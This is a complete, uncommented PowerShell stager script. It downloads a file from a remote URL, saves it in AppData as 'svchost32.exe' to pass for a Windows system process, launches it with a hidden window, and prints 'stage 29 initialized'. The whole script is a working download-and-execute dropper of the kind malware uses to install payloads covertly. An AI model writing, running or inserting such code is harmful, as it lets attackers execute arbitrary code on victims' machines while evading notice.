[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://example.org/update.dat',
    [string]$OutputPath = "$env:APPDATA\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $OutputPath)
Start-Process -FilePath $OutputPath -WindowStyle Hidden
Write-Output "stage 29 initialized"
